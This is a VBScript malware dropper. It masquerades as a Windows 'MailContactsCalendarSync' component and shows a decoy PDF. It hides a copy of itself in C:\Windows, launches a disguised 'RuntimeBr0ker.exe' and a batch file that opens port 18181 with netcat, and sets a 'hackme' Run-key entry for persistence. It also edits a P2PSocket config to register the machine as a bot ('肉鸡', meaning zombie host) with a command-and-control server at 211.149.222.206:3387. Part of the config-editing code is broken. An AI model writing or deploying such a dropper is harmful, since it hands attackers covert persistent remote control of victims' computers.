On Error Resume Next
Dim fso,Shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set Shell=Wscript.Createobject("Wscript.shell")
If Not fso.folderExists("C:\Windows\MailContactsCalendarSync\") Then         
    fso.CreateFolder "C:\Windows\MailContactsCalendarSync\"
	Shell.Run "msedge.exe C:\Windows\MailContactsCalendarSync\mydoc.pdf",0,TRUE
	fso.getfile(wscript.scriptfullname).copy("C:\Windows\run.vbs")   
End If
fso.CopyFolder ".\MailContactsCalendarSync\*", "C:\Windows\MailContactsCalendarSync\"
fso.CopyFile ".\MailContactsCalendarSync\*", "C:\Windows\MailContactsCalendarSync\"
Shell.Run "C:\Windows\MailContactsCalendarSync\RuntimeBr0ker.exe",0,FALSE
Shell.Run "cmd /c C:\Windows\MailContactsCalendarSync\open_18181_with_nc.bat",vbhide
Shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\hackme","C:\Windows\run.vbs"
Set TxtFl = fso.OpenTextFile ("C:\Users\Administrator\Desktop\log\MailContactsCalendarSync\P2PSocket\Client.ini",1)
Str = Replace ( TxtFl.ReadAll,"ClientName=QUAN","ClientName=TestJob") '肉鸡名字
Str = Replace ( TxtFl.ReadAll,"ServerAddress=211.149.222.206:3387","ServerAddress=211.149.222.206:3387")  '上线地址
TxtFl.Write Str 
TxtFl.Close
Set fso = Nothing
Set Shell = Nothing



